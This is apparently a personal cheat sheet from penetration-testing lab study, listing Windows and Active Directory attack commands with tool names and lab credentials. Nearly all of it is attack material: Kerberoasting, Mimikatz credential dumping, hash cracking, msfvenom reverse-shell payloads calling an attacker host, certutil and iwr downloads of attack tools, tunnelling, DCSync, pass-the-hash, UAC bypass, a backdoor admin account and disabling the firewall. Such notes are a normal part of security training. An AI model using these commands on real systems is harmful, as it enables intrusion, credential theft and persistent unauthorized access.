
**Kerberoasting:**
```
Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

```
sudo impacket-GetUserSPNs -request -dc-ip TARGET corp.com/pete
```

```
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

**AS-REP Roasting:** 
```
impacket-GetNPUsers -dc-ip TARGET  -request -outputfile hashes.asreproast corp.com/pete
```

without password ->
```
impacket-GetNPUsers corp.com/ -dc-ip ATTACKER -no-pass -usersfile users.txt
```

```
.\Rubeus.exe asreproast /nowrap
```

```
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

without password ->
```
./kerbrute userenum -d resourced users --dc TARGET
```

**Mimikatz:**
```
privilege::debug
```

```
lsadump::sam
```

```
sekurlsa::logonpasswords
```

```
lsadump::secrets
```

**Stageless payload .dll ->**
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=443 -f dll -o beyondhelper.dll
```

**Stageless payload .exe ->** 
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=9999 -f exe -o auditTracker.exe
```

**Evil-Winrm:**
```
evil-winrm -i TARGET -u leon -p "rabbit:)"
```

```
evil-winrm -i MS02 -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd
```

**Hashcat ->**
```
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

```
hashcat --help | grep -i "NTLM"
```

```
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

**xFreerdp ->**
```
xfreerdp /u:yoshi /p:Mushroom! /v:TARGET /d:medtech.com
```

**Impacket-secret dump ->**
```
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

**git** ->
```
git log
```

```
git show
```

**John** ->
```
zip2john file.zip > file.hash
```

```
john --wordlist=/usr/share/wordlists/rockyou.txt sitebackup3.hash
```

**Responder ->**
```
sudo responder -I tun0
```
Alternative:
```
impacket-smbserver share /tmp -smb2support -port 445
```

**impacket-mssqlclient ->**
```
impacket-mssqlclient sql_svc:Dolphin1@TARGET -windows-auth
```

**Chisel** ->
```
./chisel server --port 9090 --reverse
```

```
./chisel.1 client ATTACKER:9090 R:8000:127.0.0.1:8000
```

**snmp** ->
```
snmpwalk -v3 -c public TARGET NET-SNMP-EXTEND-MIB::nsExtendObjects
```

```
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt TARGET
```

**Certutil** ->
```
certutil -urlcache -split -f http://ATTACKER:80/nc.exe C:\Users\Public\nc.exe
```

**IWR ->** 
```
iwr -uri http://ATTACKER:80/mimikatz.exe -Outfile C:\Users\offsec\mimikatz.exe
```

**ligolo-ng ->**
```
sudo ip tuntap add user root mode tun ligolo
```

```
sudo ip link set ligolo up
```

```
./proxy -selfcert
```

```
agent.exe -connect ATTACKER:11601 -retry -ignore-cert
```

```
session
```

```
start
```

```
ip route add TARGET/24 dev ligolo
```

```
listener_add --addr 0.0.0.0:80 --to 127.0.0.1:80 --tcp
```

**Netexec ->**
```
netexec smb TARGET/24 -u users -p pass --continue-on-success
```

```
netexec smb TARGET -u "" -p "" --users
```


**Bloodhound ->**
```
Import-Module .\Sharphound.ps1
```

```
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\joe\ -OutputPrefix "MEDTECH"
```

```
sudo neo4j start
```

```
http://localhost:7474
```

**Impacket-secretsdump** ->
```
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@TARGET
```
dcsync attack to obtain the NTLM hash of dave

```
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

```
secretsdump.py hutch.offsec/administrator:'9%GR6qN[.#)x4i'@TARGET
```

**Psexec** (UACbypass)->
```
.\psexec64.exe -i -accepteula -d -s C:\\programdata\\shell.exe
```
(shell.exe -> rev shell payload)

```
./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
```

```
psexec.py domainadmin@TARGET -hashes aad3b435b51404eeaad3b435b51404ee:8730fa0d1014eb78c61e3957aa7b93d7
```

**LAPS** ->

```
crackmapexec ldap TARGET -u fmcsorley -p CrabSharkJellyfish192 --kdcHost TARGET -M laps
```
To dump administrators password

**LDAPsearch ->**

```
ldapsearch -v -x -b 'dc=hutch,dc=offsec' -H 'ldap://TARGET' '(objectclass=*)' > ldap_search.txt
```

```
cat ldap_search.txt | grep -i "samaccountname"\
```
To get all the users 

```
cat raw_users.txt | cut -d: -f2 | tr -d " " > users.txt
```

```
kerbrute -domain hutch.offsec -users ./users.txt -dc-ip TARGET
```
Confirming that all the users are valid 

```
cat ldap_search.txt | grep -i description
```

```
crackmapexec smb TARGET -u ./users.txt -p ./passwords.txt --continue-on-success
```

**RPCclient ->**

```
rpcclient -U nagoya-industries/svc_helpdesk TARGET
```
```
enumdomusers
```
```
enumdomgroups
```
```
setuserinfo
```
```
setuserinfo
```

**To find what user is running the service ->** 
```
sc query {service_name}
```

UAC bypass ->

```
.\PsExec.exe -i -s "C:\temp\rev.bat"
```

![[Pasted image 20240727221853.png]]

**Scheduled Tasks ->**
```
schtasks /query /fo LIST /v /TN "[taskname]"
```

**Backdoor Access ->**
```
net user /add backdoor Password1
```
```
net localgroup admininstrators /add backdoor
```

**To enable RDP ->**
```
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0 /f
```

**To disable to firewall ->**
```
netsh advfirewall set allprofiles state off
```
